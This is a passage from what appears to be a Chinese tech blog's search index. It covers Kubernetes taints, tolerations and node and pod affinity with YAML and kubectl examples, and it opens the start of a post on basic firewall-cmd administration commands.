都会马上被驱逐，任何可以忍受这个污点的 Pod 都不会被驱逐。 但是，如果 Pod 存在一个 effect 值为 NoExecute 的容忍度指定了可选属性 tolerationSeconds 的值，则表示在给节点添加了上述污点之后， Pod 还能继续在节点上运行的时间。例如， tolerations:- key:\"key1\"operator:\"Equal\"value:\"value1\"effect:\"NoExecute\"tolerationSeconds:3600 这表示如果这个 Pod 正在运行，同时一个匹配的污点被添加到其所在的节点， 那么 Pod 还将继续在节点上运行 3600 秒，然后被驱逐。 如果在此之前上述污点被删除了，则 Pod 不会被驱逐。 ","date":"2022-08-01","objectID":"/posts/2022/08/k8s%E7%9A%84pod%E7%9A%84%E6%B1%A1%E7%82%B9%E5%AE%B9%E5%BF%8D%E5%BA%A6%E5%92%8C%E4%BA%B2%E5%92%8C%E6%80%A7%E8%AF%B4%E6%98%8Ek8s-pod-tanit-tolerance-and-affinity/:1:1","tags":["K8S"],"title":"k8s的pod的污点容忍度和亲和性说明[k8s pod tanit-tolerance and affinity]","uri":"/posts/2022/08/k8s%E7%9A%84pod%E7%9A%84%E6%B1%A1%E7%82%B9%E5%AE%B9%E5%BF%8D%E5%BA%A6%E5%92%8C%E4%BA%B2%E5%92%8C%E6%80%A7%E8%AF%B4%E6%98%8Ek8s-pod-tanit-tolerance-and-affinity/"},{"categories":["K8S"],"content":"使用例子 通过污点和容忍度，可以灵活地让 Pod 避开某些节点或者将 Pod 从某些节点驱逐。 下面是几个使用例子： 专用节点：如果你想将某些节点专门分配给特定的一组用户使用，你可以给这些节点添加一个污点（即， kubectl taint nodes nodename dedicated=groupName:NoSchedule）， 然后给这组用户的 Pod 添加一个相对应的容忍度 （通过编写一个自定义的准入控制器来实现）。 拥有上述容忍度的 Pod 就能够被调度到上述专用节点，同时也能够被调度到集群中的其它节点。 如果你希望这些 Pod 只能被调度到上述专用节点， 那么你还需要给这些专用节点另外添加一个和上述污点类似的 label （例如：dedicated=groupName）， 同时还要在上述准入控制器中给 Pod 增加节点亲和性要求，要求上述 Pod 只能被调度到添加了 dedicated=groupName 标签的节点上。 配备了特殊硬件的节点：在部分节点配备了特殊硬件（比如 GPU）的集群中， 我们希望不需要这类硬件的 Pod 不要被调度到这些特殊节点，以便为后继需要这类硬件的 Pod 保留资源。 要达到这个目的，可以先给配备了特殊硬件的节点添加污点 （例如 kubectl taint nodes nodename special=true:NoSchedule 或 kubectl taint nodes nodename special=true:PreferNoSchedule)， 然后给使用了这类特殊硬件的 Pod 添加一个相匹配的容忍度。 和专用节点的例子类似，添加这个容忍度的最简单的方法是使用自定义 准入控制器。 比如，我们推荐使用扩展资源 来表示特殊硬件，给配置了特殊硬件的节点添加污点时包含扩展资源名称， 然后运行一个 ExtendedResourceToleration 准入控制器。此时，因为节点已经被设置污点了，没有对应容忍度的 Pod 不会被调度到这些节点。 但当你创建一个使用了扩展资源的 Pod 时，ExtendedResourceToleration 准入控制器会自动给 Pod 加上正确的容忍度，这样 Pod 就会被自动调度到这些配置了特殊硬件的节点上。 这种方式能够确保配置了特殊硬件的节点专门用于运行需要这些硬件的 Pod， 并且你无需手动给这些 Pod 添加容忍度。 基于污点的驱逐: 这是在每个 Pod 中配置的在节点出现问题时的驱逐行为， 接下来的章节会描述这个特性。 ","date":"2022-08-01","objectID":"/posts/2022/08/k8s%E7%9A%84pod%E7%9A%84%E6%B1%A1%E7%82%B9%E5%AE%B9%E5%BF%8D%E5%BA%A6%E5%92%8C%E4%BA%B2%E5%92%8C%E6%80%A7%E8%AF%B4%E6%98%8Ek8s-pod-tanit-tolerance-and-affinity/:1:2","tags":["K8S"],"title":"k8s的pod的污点容忍度和亲和性说明[k8s pod tanit-tolerance and affinity]","uri":"/posts/2022/08/k8s%E7%9A%84pod%E7%9A%84%E6%B1%A1%E7%82%B9%E5%AE%B9%E5%BF%8D%E5%BA%A6%E5%92%8C%E4%BA%B2%E5%92%8C%E6%80%A7%E8%AF%B4%E6%98%8Ek8s-pod-tanit-tolerance-and-affinity/"},{"categories":["K8S"],"content":"基于污点的驱逐 特性状态： Kubernetes v1.18 [stable] 前文提到过污点的效果值 NoExecute 会影响已经在节点上运行的 Pod，如下 如果 Pod 不能忍受这类污点，Pod 会马上被驱逐 如果 Pod 能够忍受这类污点，但是在容忍度定义中没有指定 tolerationSeconds， 则 Pod 还会一直在这个节点上运行。 如果 Pod 能够忍受这类污点，而且指定了 tolerationSeconds， 则 Pod 还能在这个节点上继续运行这个指定的时间长度。 当某种条件为真时，节点控制器会自动给节点添加一个污点。当前内置的污点包括： node.kubernetes.io/not-ready：节点未准备好。这相当于节点状况 Ready 的值为 “False\"。 node.kubernetes.io/unreachable：节点控制器访问不到节点. 这相当于节点状况 Ready 的值为 “Unknown\"。 node.kubernetes.io/memory-pressure：节点存在内存压力。 node.kubernetes.io/disk-pressure：节点存在磁盘压力。 node.kubernetes.io/pid-pressure: 节点的 PID 压力。 node.kubernetes.io/network-unavailable：节点网络不可用。 node.kubernetes.io/unschedulable: 节点不可调度。 node.cloudprovider.kubernetes.io/uninitialized：如果 kubelet 启动时指定了一个“外部”云平台驱动， 它将给当前节点添加一个污点将其标志为不可用。在 cloud-controller-manager 的一个控制器初始化这个节点后，kubelet 将删除这个污点。 在节点被驱逐时，节点控制器或者 kubelet 会添加带有 NoExecute 效果的相关污点。 如果异常状态恢复正常，kubelet 或节点控制器能够移除相关的污点。 说明： 控制面会限制向节点添加新污点的速率。这一速率限制可以管理多个节点同时不可达时 （例如出现网络中断的情况），可能触发的驱逐的数量。 你可以为 Pod 设置 tolerationSeconds，以指定当节点失效或者不响应时， Pod 维系与该节点间绑定关系的时长。 比如，你可能希望在出现网络分裂事件时，对于一个与节点本地状态有着深度绑定的应用而言， 仍然停留在当前节点上运行一段较长的时间，以等待网络恢复以避免被驱逐。 你为这种 Pod 所设置的容忍度看起来可能是这样： tolerations:- key:\"node.kubernetes.io/unreachable\"operator:\"Exists\"effect:\"NoExecute\"tolerationSeconds:6000 说明： Kubernetes 会自动给 Pod 添加针对 node.kubernetes.io/not-ready 和 node.kubernetes.io/unreachable 的容忍度，且配置 tolerationSeconds=300， 除非用户自身或者某控制器显式设置此容忍度。 这些自动添加的容忍度意味着 Pod 可以在检测到对应的问题之一时，在 5 分钟内保持绑定在该节点上。 DaemonSet 中的 Pod 被创建时， 针对以下污点自动添加的 NoExecute 的容忍度将不会指定 tolerationSeconds： node.kubernetes.io/unreachable node.kubernetes.io/not-ready 这保证了出现上述问题时 DaemonSet 中的 Pod 永远不会被驱逐。 ","date":"2022-08-01","objectID":"/posts/2022/08/k8s%E7%9A%84pod%E7%9A%84%E6%B1%A1%E7%82%B9%E5%AE%B9%E5%BF%8D%E5%BA%A6%E5%92%8C%E4%BA%B2%E5%92%8C%E6%80%A7%E8%AF%B4%E6%98%8Ek8s-pod-tanit-tolerance-and-affinity/:1:3","tags":["K8S"],"title":"k8s的pod的污点容忍度和亲和性说明[k8s pod tanit-tolerance and affinity]","uri":"/posts/2022/08/k8s%E7%9A%84pod%E7%9A%84%E6%B1%A1%E7%82%B9%E5%AE%B9%E5%BF%8D%E5%BA%A6%E5%92%8C%E4%BA%B2%E5%92%8C%E6%80%A7%E8%AF%B4%E6%98%8Ek8s-pod-tanit-tolerance-and-affinity/"},{"categories":["K8S"],"content":"基于节点状态添加污点 控制平面使用节点控制器自动创建 与节点状况 对应的、效果为 NoSchedule 的污点。 调度器在进行调度时检查污点，而不是检查节点状况。这确保节点状况不会直接影响调度。 例如，如果 DiskPressure 节点状况处于活跃状态，则控制平面添加 node.kubernetes.io/disk-pressure 污点并且不会调度新的 Pod 到受影响的节点。 如果 MemoryPressure 节点状况处于活跃状态，则控制平面添加 node.kubernetes.io/memory-pressure 污点。 对于新创建的 Pod，可以通过添加相应的 Pod 容忍度来忽略节点状况。 控制平面还在具有除 BestEffort 之外的 QoS 类的 Pod 上添加 node.kubernetes.io/memory-pressure 容忍度。 这是因为 Kubernetes 将 Guaranteed 或 Burstable QoS 类中的 Pod（甚至没有设置内存请求的 Pod） 视为能够应对内存压力，而新创建的 BestEffort Pod 不会被调度到受影响的节点上。 DaemonSet 控制器自动为所有守护进程添加如下 NoSchedule 容忍度以防 DaemonSet 崩溃： node.kubernetes.io/memory-pressure node.kubernetes.io/disk-pressure node.kubernetes.io/pid-pressure (1.14 或更高版本) node.kubernetes.io/unschedulable (1.10 或更高版本) node.kubernetes.io/network-unavailable (只适合主机网络配置) 添加上述容忍度确保了向后兼容，你也可以选择自由向 DaemonSet 添加容忍度。 ","date":"2022-08-01","objectID":"/posts/2022/08/k8s%E7%9A%84pod%E7%9A%84%E6%B1%A1%E7%82%B9%E5%AE%B9%E5%BF%8D%E5%BA%A6%E5%92%8C%E4%BA%B2%E5%92%8C%E6%80%A7%E8%AF%B4%E6%98%8Ek8s-pod-tanit-tolerance-and-affinity/:1:4","tags":["K8S"],"title":"k8s的pod的污点容忍度和亲和性说明[k8s pod tanit-tolerance and affinity]","uri":"/posts/2022/08/k8s%E7%9A%84pod%E7%9A%84%E6%B1%A1%E7%82%B9%E5%AE%B9%E5%BF%8D%E5%BA%A6%E5%92%8C%E4%BA%B2%E5%92%8C%E6%80%A7%E8%AF%B4%E6%98%8Ek8s-pod-tanit-tolerance-and-affinity/"},{"categories":["K8S"],"content":"将 Pod 指派给节点 你可以约束一个 Pod 只能在特定的节点上运行。 有几种方法可以实现这点，推荐的方法都是用 标签选择算符来进行选择。 通常这样的约束不是必须的，因为调度器将自动进行合理的放置（比如，将 Pod 分散到节点上， 而不是将 Pod 放置在可用资源不足的节点上等等）。但在某些情况下，你可能需要进一步控制 Pod 被部署到的节点。例如，确保 Pod 最终落在连接了 SSD 的机器上， 或者将来自两个不同的服务且有大量通信的 Pods 被放置在同一个可用区。 你可以使用下列方法中的任何一种来选择 Kubernetes 对特定 Pod 的调度： 与节点标签匹配的 nodeSelector 亲和性与反亲和性 nodeName 字段 ","date":"2022-08-01","objectID":"/posts/2022/08/k8s%E7%9A%84pod%E7%9A%84%E6%B1%A1%E7%82%B9%E5%AE%B9%E5%BF%8D%E5%BA%A6%E5%92%8C%E4%BA%B2%E5%92%8C%E6%80%A7%E8%AF%B4%E6%98%8Ek8s-pod-tanit-tolerance-and-affinity/:2:0","tags":["K8S"],"title":"k8s的pod的污点容忍度和亲和性说明[k8s pod tanit-tolerance and affinity]","uri":"/posts/2022/08/k8s%E7%9A%84pod%E7%9A%84%E6%B1%A1%E7%82%B9%E5%AE%B9%E5%BF%8D%E5%BA%A6%E5%92%8C%E4%BA%B2%E5%92%8C%E6%80%A7%E8%AF%B4%E6%98%8Ek8s-pod-tanit-tolerance-and-affinity/"},{"categories":["K8S"],"content":"nodeSelector nodeSelector 是节点选择约束的最简单推荐形式。你可以将 nodeSelector 字段添加到 Pod 的规约中设置你希望目标节点所具有的节点标签。 Kubernetes 只会将 Pod 调度到拥有你所指定的每个标签的节点上。 ","date":"2022-08-01","objectID":"/posts/2022/08/k8s%E7%9A%84pod%E7%9A%84%E6%B1%A1%E7%82%B9%E5%AE%B9%E5%BF%8D%E5%BA%A6%E5%92%8C%E4%BA%B2%E5%92%8C%E6%80%A7%E8%AF%B4%E6%98%8Ek8s-pod-tanit-tolerance-and-affinity/:2:1","tags":["K8S"],"title":"k8s的pod的污点容忍度和亲和性说明[k8s pod tanit-tolerance and affinity]","uri":"/posts/2022/08/k8s%E7%9A%84pod%E7%9A%84%E6%B1%A1%E7%82%B9%E5%AE%B9%E5%BF%8D%E5%BA%A6%E5%92%8C%E4%BA%B2%E5%92%8C%E6%80%A7%E8%AF%B4%E6%98%8Ek8s-pod-tanit-tolerance-and-affinity/"},{"categories":["K8S"],"content":"亲和性与反亲和性 nodeSelector 提供了一种最简单的方法来将 Pod 约束到具有特定标签的节点上。 亲和性和反亲和性扩展了你可以定义的约束类型。使用亲和性与反亲和性的一些好处有： 亲和性、反亲和性语言的表达能力更强。nodeSelector 只能选择拥有所有指定标签的节点。 亲和性、反亲和性为你提供对选择逻辑的更强控制能力。 你可以标明某规则是“软需求”或者“偏好”，这样调度器在无法找到匹配节点时仍然调度该 Pod。 你可以使用节点上（或其他拓扑域中）运行的其他 Pod 的标签来实施调度约束， 而不是只能使用节点本身的标签。这个能力让你能够定义规则允许哪些 Pod 可以被放置在一起。 亲和性功能由两种类型的亲和性组成： 节点亲和性功能类似于 nodeSelector 字段，但它的表达能力更强，并且允许你指定软规则。 Pod 间亲和性/反亲和性允许你根据其他 Pod 的标签来约束 Pod。 节点亲和性 节点亲和性概念上类似于 nodeSelector， 它使你可以根据节点上的标签来约束 Pod 可以调度到哪些节点上。 节点亲和性有两种： requiredDuringSchedulingIgnoredDuringExecution： 调度器只有在规则被满足的时候才能执行调度。此功能类似于 nodeSelector， 但其语法表达能力更强。 preferredDuringSchedulingIgnoredDuringExecution： 调度器会尝试寻找满足对应规则的节点。如果找不到匹配的节点，调度器仍然会调度该 Pod。 说明： 在上述类型中，IgnoredDuringExecution 意味着如果节点标签在 Kubernetes 调度 Pod 时发生了变更，Pod 仍将继续运行。 你可以使用 Pod 规约中的 .spec.affinity.nodeAffinity 字段来设置节点亲和性。 例如，考虑下面的 Pod 规约： pods/pod-with-node-affinity.yaml apiVersion:v1kind:Podmetadata:name:with-node-affinityspec:affinity:nodeAffinity:requiredDuringSchedulingIgnoredDuringExecution:nodeSelectorTerms:- matchExpressions:- key:kubernetes.io/osoperator:Invalues:- linuxpreferredDuringSchedulingIgnoredDuringExecution:- weight:1preference:matchExpressions:- key:another-node-label-keyoperator:Invalues:- another-node-label-valuecontainers:- name:with-node-affinityimage:k8s.gcr.io/pause:2.0 说明： 如果你希望 Kubernetes 能够成功地调度此例中的 Pod，你必须拥有打了 kubernetes.io/os=linux 标签的节点。 apiVersion:v1kind:Podmetadata:name:with-node-affinityspec:affinity:nodeAffinity:requiredDuringSchedulingIgnoredDuringExecution:nodeSelectorTerms:- matchExpressions:- key:topology.kubernetes.io/zoneoperator:Invalues:- antarctica-east1- antarctica-west1preferredDuringSchedulingIgnoredDuringExecution:- weight:1preference:matchExpressions:- key:another-node-label-keyoperator:Invalues:- another-node-label-valuecontainers:- name:with-node-affinityimage:k8s.gcr.io/pause:2.0 在这一示例中，所应用的规则如下： 节点必须包含一个键名为 topology.kubernetes.io/zone 的标签， 并且该标签的取值必须为 antarctica-east1 或 antarctica-west1。 节点最好具有一个键名为 another-node-label-key 且取值为 another-node-label-value 的标签。 你可以使用 operator 字段来为 Kubernetes 设置在解释规则时要使用的逻辑操作符。 你可以使用 In、NotIn、Exists、DoesNotExist、Gt 和 Lt 之一作为操作符。 NotIn 和 DoesNotExist 可用来实现节点反亲和性行为。 你也可以使用节点污点 将 Pod 从特定节点上驱逐。 说明： 如果你同时指定了 nodeSelector 和 nodeAffinity，两者 必须都要满足， 才能将 Pod 调度到候选节点上。 如果你指定了多个与 nodeAffinity 类型关联的 nodeSelectorTerms， 只要其中一个 nodeSelectorTerms 满足的话，Pod 就可以被调度到节点上。 如果你指定了多个与同一 nodeSelectorTerms 关联的 matchExpressions， 则只有当所有 matchExpressions 都满足时 Pod 才可以被调度到节点上。 参阅使用节点亲和性来为 Pod 指派节点， 以了解进一步的信息。 节点亲和性权重 你可以为 preferredDuringSchedulingIgnoredDuringExecution 亲和性类型的每个实例设置 weight 字段，其取值范围是 1 到 100。 当调度器找到能够满足 Pod 的其他调度请求的节点时，调度器会遍历节点满足的所有的偏好性规则， 并将对应表达式的 weight 值加和。 最终的加和值会添加到该节点的其他优先级函数的评分之上。 在调度器为 Pod 作出调度决定时，总分最高的节点的优先级也最高。 例如，考虑下面的 Pod 规约： pods/pod-with-affinity-anti-affinity.yaml apiVersion:v1kind:Podmetadata:name:with-affinity-anti-affinityspec:affinity:nodeAffinity:requiredDuringSchedulingIgnoredDuringExecution:nodeSelectorTerms:- matchExpressions:- key:topology.kubernetes.io/zoneoperator:Invalues:- antarctica-east1- antarctica-west1preferredDuringSchedulingIgnoredDuringExecution:- weight:1preference:matchExpressions:- key:label-1operator:Invalues:- key-1- weight:50preference:matchExpressions:- key:label-2operator:Invalues:- key-2containers:- name:with-node-affinityimage:k8s.gcr.io/pause:2.0 如果存在两个候选节点，都满足 requiredDuringSchedulingIgnoredDuringExecution 规则， 其中一个节点具有标签 label-1:key-1，另一个节点具有标签 label-2:key-2， 调度器会考察各个节点的 weight 取值，并将该权重值添加到节点的其他得分值之上。 注意：此策略需要考虑调度器的优选策略实现方式。 Pod 间亲和性与反亲和性 Pod 间亲和性与反亲和性使你可以基于已经在节点上运行的 Pod 的标签来约束 Pod 可以调度到的节点，而不是基于节点上的标签。 Pod 间亲和性与反亲和性的规则格式为“如果 X 上已经运行了一个或多个满足规则 Y 的 Pod， 则这个 Pod 应该（或者在反亲和性的情况下不应该）运行在 X 上”。 这里的 X 可以是节点、机架、云提供商可用区或地理区域或类似的拓扑域， Y 则是 Kubernetes 尝试满足的规则。 你通过标签选择算符 的形式来表达规则（Y），并可根据需要指定选关联的名字空间列表。 Pod 在 Kubernetes 中是名字空间作用域的对象，因此 Pod 的标签也隐式地具有名字空间属性。 针对 Pod 标签的所有标签选择算符都要指定名字空间，Kubernetes 会在指定的名字空间内寻找标签。 你会通过 topologyKey 来表达拓扑域（X）的概念，其取值是系统用来标示域的节点标签键。 相关示例可参见常用标签、注解和污点。 说明： Pod 间亲和性和反亲和性都需要相当的计算量，因此会在大规模集群中显著降低调度速度。 我们不建议在包含数百个节点的集群中使用这类设置。 说明： P","date":"2022-08-01","objectID":"/posts/2022/08/k8s%E7%9A%84pod%E7%9A%84%E6%B1%A1%E7%82%B9%E5%AE%B9%E5%BF%8D%E5%BA%A6%E5%92%8C%E4%BA%B2%E5%92%8C%E6%80%A7%E8%AF%B4%E6%98%8Ek8s-pod-tanit-tolerance-and-affinity/:2:2","tags":["K8S"],"title":"k8s的pod的污点容忍度和亲和性说明[k8s pod tanit-tolerance and affinity]","uri":"/posts/2022/08/k8s%E7%9A%84pod%E7%9A%84%E6%B1%A1%E7%82%B9%E5%AE%B9%E5%BF%8D%E5%BA%A6%E5%92%8C%E4%BA%B2%E5%92%8C%E6%80%A7%E8%AF%B4%E6%98%8Ek8s-pod-tanit-tolerance-and-affinity/"},{"categories":["K8S"],"content":"用节点亲和性把 Pods 分配到节点 ","date":"2022-08-01","objectID":"/posts/2022/08/k8s%E7%9A%84pod%E7%9A%84%E6%B1%A1%E7%82%B9%E5%AE%B9%E5%BF%8D%E5%BA%A6%E5%92%8C%E4%BA%B2%E5%92%8C%E6%80%A7%E8%AF%B4%E6%98%8Ek8s-pod-tanit-tolerance-and-affinity/:3:0","tags":["K8S"],"title":"k8s的pod的污点容忍度和亲和性说明[k8s pod tanit-tolerance and affinity]","uri":"/posts/2022/08/k8s%E7%9A%84pod%E7%9A%84%E6%B1%A1%E7%82%B9%E5%AE%B9%E5%BF%8D%E5%BA%A6%E5%92%8C%E4%BA%B2%E5%92%8C%E6%80%A7%E8%AF%B4%E6%98%8Ek8s-pod-tanit-tolerance-and-affinity/"},{"categories":["K8S"],"content":"给节点添加标签 列出集群中的节点及其标签： kubectl get nodes --show-labels 输出类似于此： NAME STATUS ROLES AGE VERSION LABELS worker0 Ready \u003cnone\u003e 1d v1.13.0 ...,kubernetes.io/hostname=worker0 worker1 Ready \u003cnone\u003e 1d v1.13.0 ...,kubernetes.io/hostname=worker1 worker2 Ready \u003cnone\u003e 1d v1.13.0 ...,kubernetes.io/hostname=worker2 选择一个节点，给它添加一个标签： kubectl label nodes \u003cyour-node-name\u003e disktype=ssd 其中 \u003cyour-node-name\u003e 是你所选节点的名称。 验证你所选节点具有 disktype=ssd 标签： kubectl get nodes --show-labels 输出类似于此： NAME STATUS ROLES AGE VERSION LABELS worker0 Ready \u003cnone\u003e 1d v1.13.0 ...,disktype=ssd,kubernetes.io/hostname=worker0 worker1 Ready \u003cnone\u003e 1d v1.13.0 ...,kubernetes.io/hostname=worker1 worker2 Ready \u003cnone\u003e 1d v1.13.0 ...,kubernetes.io/hostname=worker2 在前面的输出中，可以看到 `worker0` 节点有一个 `disktype=ssd` 标签。 ","date":"2022-08-01","objectID":"/posts/2022/08/k8s%E7%9A%84pod%E7%9A%84%E6%B1%A1%E7%82%B9%E5%AE%B9%E5%BF%8D%E5%BA%A6%E5%92%8C%E4%BA%B2%E5%92%8C%E6%80%A7%E8%AF%B4%E6%98%8Ek8s-pod-tanit-tolerance-and-affinity/:3:1","tags":["K8S"],"title":"k8s的pod的污点容忍度和亲和性说明[k8s pod tanit-tolerance and affinity]","uri":"/posts/2022/08/k8s%E7%9A%84pod%E7%9A%84%E6%B1%A1%E7%82%B9%E5%AE%B9%E5%BF%8D%E5%BA%A6%E5%92%8C%E4%BA%B2%E5%92%8C%E6%80%A7%E8%AF%B4%E6%98%8Ek8s-pod-tanit-tolerance-and-affinity/"},{"categories":["K8S"],"content":"依据强制的节点亲和性调度 Pod 下面清单描述了一个 Pod，它有一个节点亲和性配置 requiredDuringSchedulingIgnoredDuringExecution，disktype=ssd。 这意味着 pod 只会被调度到具有 disktype=ssd 标签的节点上。 pods/pod-nginx-required-affinity.yaml apiVersion:v1kind:Podmetadata:name:nginxspec:affinity:nodeAffinity:requiredDuringSchedulingIgnoredDuringExecution:nodeSelectorTerms:- matchExpressions:- key:disktypeoperator:Invalues:- ssd containers:- name:nginximage:nginximagePullPolicy:IfNotPresent 执行（Apply）此清单来创建一个调度到所选节点上的 Pod： kubectl apply -f https://k8s.io/examples/pods/pod-nginx-required-affinity.yaml 验证 pod 已经在所选节点上运行： kubectl get pods --output=wide 输出类似于此： NAME READY STATUS RESTARTS AGE IP NODE nginx 1/1 Running 0 13s 10.200.0.4 worker0 ","date":"2022-08-01","objectID":"/posts/2022/08/k8s%E7%9A%84pod%E7%9A%84%E6%B1%A1%E7%82%B9%E5%AE%B9%E5%BF%8D%E5%BA%A6%E5%92%8C%E4%BA%B2%E5%92%8C%E6%80%A7%E8%AF%B4%E6%98%8Ek8s-pod-tanit-tolerance-and-affinity/:3:2","tags":["K8S"],"title":"k8s的pod的污点容忍度和亲和性说明[k8s pod tanit-tolerance and affinity]","uri":"/posts/2022/08/k8s%E7%9A%84pod%E7%9A%84%E6%B1%A1%E7%82%B9%E5%AE%B9%E5%BF%8D%E5%BA%A6%E5%92%8C%E4%BA%B2%E5%92%8C%E6%80%A7%E8%AF%B4%E6%98%8Ek8s-pod-tanit-tolerance-and-affinity/"},{"categories":["K8S"],"content":"使用首选的节点亲和性调度 Pod 本清单描述了一个Pod，它有一个节点亲和性设置 preferredDuringSchedulingIgnoredDuringExecution，disktype: ssd。 这意味着 pod 将首选具有 disktype=ssd 标签的节点。 pods/pod-nginx-preferred-affinity.yaml apiVersion:v1kind:Podmetadata:name:nginxspec:affinity:nodeAffinity:preferredDuringSchedulingIgnoredDuringExecution:- weight:1preference:matchExpressions:- key:disktypeoperator:Invalues:- ssd containers:- name:nginximage:nginximagePullPolicy:IfNotPresent 执行此清单创建一个会调度到所选节点上的 Pod： kubectl apply -f https://k8s.io/examples/pods/pod-nginx-preferred-affinity.yaml 验证 pod 是否在所选节点上运行： kubectl get pods --output=wide 输出类似于此： NAME READY STATUS RESTARTS AGE IP NODE nginx 1/1 Running 0 13s 10.200.0.4 worker0 ","date":"2022-08-01","objectID":"/posts/2022/08/k8s%E7%9A%84pod%E7%9A%84%E6%B1%A1%E7%82%B9%E5%AE%B9%E5%BF%8D%E5%BA%A6%E5%92%8C%E4%BA%B2%E5%92%8C%E6%80%A7%E8%AF%B4%E6%98%8Ek8s-pod-tanit-tolerance-and-affinity/:3:3","tags":["K8S"],"title":"k8s的pod的污点容忍度和亲和性说明[k8s pod tanit-tolerance and affinity]","uri":"/posts/2022/08/k8s%E7%9A%84pod%E7%9A%84%E6%B1%A1%E7%82%B9%E5%AE%B9%E5%BF%8D%E5%BA%A6%E5%92%8C%E4%BA%B2%E5%92%8C%E6%80%A7%E8%AF%B4%E6%98%8Ek8s-pod-tanit-tolerance-and-affinity/"},{"categories":["K8S"],"content":"示例 nodeAffinity测试 affinitypod.yaml apiVersion:v1kind:Podmetadata:name:tini-test-1spec:containers:#- image: 100.7.36.88:5000/com.inspur/busybox:1.31.0- image:com.inspur/busybox:1.31.0imagePullPolicy:IfNotPresentname:busyboxcommand:- \"sh\"- \"-c\"- \"sleep 60m\"resources:requests:cpu:\"1\"limits:cpu:\"1\"restartPolicy:NeverschedulerName:kube-batch#nodeSelector:# gpuShare: \"true\"# kubernetes.io/hostname: \"node3\"affinity:nodeAffinity:requiredDuringSchedulingIgnoredDuringExecution:# 硬策略nodeSelectorTerms:# - matchExpressions:# - key: node-role.kubernetes.io/master# operator: In# values:# - \"true\"# - matchExpressions:# - key: kubernetes.io/hostname# operator: In# values:# - \"node-arm-22\"- matchExpressions:- key:mount/tinioperator:NotInvalues:- \"failed\" ","date":"2022-08-01","objectID":"/posts/2022/08/k8s%E7%9A%84pod%E7%9A%84%E6%B1%A1%E7%82%B9%E5%AE%B9%E5%BF%8D%E5%BA%A6%E5%92%8C%E4%BA%B2%E5%92%8C%E6%80%A7%E8%AF%B4%E6%98%8Ek8s-pod-tanit-tolerance-and-affinity/:3:4","tags":["K8S"],"title":"k8s的pod的污点容忍度和亲和性说明[k8s pod tanit-tolerance and affinity]","uri":"/posts/2022/08/k8s%E7%9A%84pod%E7%9A%84%E6%B1%A1%E7%82%B9%E5%AE%B9%E5%BF%8D%E5%BA%A6%E5%92%8C%E4%BA%B2%E5%92%8C%E6%80%A7%E8%AF%B4%E6%98%8Ek8s-pod-tanit-tolerance-and-affinity/"},{"categories":["Linux"],"content":"介绍linux防火墙firewall-cmd常用命令操作","date":"2022-07-31","objectID":"/posts/2022/07/linux%E9%98%B2%E7%81%AB%E5%A2%99firewall-cmd%E5%91%BD%E4%BB%A4%E8%AF%B4%E6%98%8E/","tags":["Linux"],"title":"linux防火墙firewall-cmd命令说明","uri":"/posts/2022/07/linux%E9%98%B2%E7%81%AB%E5%A2%99firewall-cmd%E5%91%BD%E4%BB%A4%E8%AF%B4%E6%98%8E/"},{"categories":["Linux"],"content":"介绍linux防火墙firewall-cmd常用命令操作 ","date":"2022-07-31","objectID":"/posts/2022/07/linux%E9%98%B2%E7%81%AB%E5%A2%99firewall-cmd%E5%91%BD%E4%BB%A4%E8%AF%B4%E6%98%8E/:0:0","tags":["Linux"],"title":"linux防火墙firewall-cmd命令说明","uri":"/posts/2022/07/linux%E9%98%B2%E7%81%AB%E5%A2%99firewall-cmd%E5%91%BD%E4%BB%A4%E8%AF%B4%E6%98%8E/"},{"categories":["Linux"],"content":"开启防火墙 systemctl start firewalld.service ","date":"2022-07-31","objectID":"/posts/2022/07/linux%E9%98%B2%E7%81%AB%E5%A2%99firewall-cmd%E5%91%BD%E4%BB%A4%E8%AF%B4%E6%98%8E/:1:0","tags":["Linux"],"title":"linux防火墙firewall-cmd命令说明","uri":"/posts/2022/07/linux%E9%98%B2%E7%81%AB%E5%A2%99firewall-cmd%E5%91%BD%E4%BB%A4%E8%AF%B4%E6%98%8E/"},{"categories":["Linux"],"content":"防火墙开机启动 systemctl enable firewalld.service ","date":"2022-07-31","objectID":"/posts/2022/07/linux%E9%98%B2%E7%81%AB%E5%A2%99firewall-cmd%E5%91%BD%E4%BB%A4%E8%AF%B4%E6%98%8E/:2:0","tags":["Linux"],"title":"linux防火墙firewall-cmd命令说明","uri":"/posts/2022/07/linux%E9%98%B2%E7%81%AB%E5%A2%99firewall-cmd%E5%91%BD%E4%BB%A4%E8%AF%B4%E6%98%8E/"},{"categories":["Linux"],"content":"关闭防火墙 systemctl stop firewalld.service ","date":"2022-07-31","objectID":"/posts/2022/07/linux%E9%98%B2%E7%81%AB%E5%A2%99firewall-cmd%E5%91%BD%E4%BB%A4%E8%AF%B4%E6%98%8E/:3:0","tags":["Linux"],"title":"linux防火墙firewall-cmd命令说明","uri":"/posts/2022/07/linux%E9%98%B2%E7%81%AB%E5%A2%99firewall-cmd%E5%91%BD%E4%BB%A4%E8%AF%B4%E6%98%8E/"},{"categories":["Linux"],"content":"查看防火墙状态 firewall-cmd --state ","date":"2022-07-31","objectID":"/posts/2022/07/linux%E9%98%B2%E7%81%AB%E5%A2%99firewall-cmd%E5%91%BD%E4%BB%A4%E8%AF%B4%E6%98%8E/:4:0","tags":["Linux"],"title":"linux防火墙firewall-cmd命令说明","uri":"/posts/2022/07/linux%E9%98%B2%E7%81%AB%E5%A2%99firewall-cmd%E5%91%BD%E4%BB%A4%E8%AF%B4%E6%98%8E/"},{"categories":["Linux"],"content":"查看现有的规则 iptables -nL ","date":"2022-07-31","objectID":"/posts/2022/07/linux%E9%98%B2%E7%81%AB%E5%A2%99firewall-cmd%E5%91%BD%E4%BB%A4%E8%AF%B4%E6%98%8E/:5:0","tags":["Linux"],"title":"linux防火墙firewall-cmd命令说明","uri":"/posts/2022/07/linux%E9%98%B2%E7%81%AB%E5%A2%99firewall-cmd%E5%91%BD%E4%BB%A4%E8%AF%B4%E6%98%8E/"},{"categories":["Linux"],"content":"重载防火墙配置 firewall-cmd --reload ","date":"2022-07-31","objectID":"/posts/2022/07/linux%E9%98%B2%E7%81%AB%E5%A2%99firewall-cmd%E5%91%BD%E4%BB%A4%E8%AF%B4%E6%98%8E/:6:0","tags":["Linux"],"title":"linux防火墙firewall-cmd命令说明","uri":"/posts/2022/07/linux%E9%98%B2%E7%81%AB%E5%A2%99firewall-cmd%E5%91%BD%E4%BB%A4%E8%AF%B4%E6%98%8E/"},{"categories":["Linux"],"content":"添加单个单端口 firewall-cmd --permanent --zone=public --add-port=81/tcp 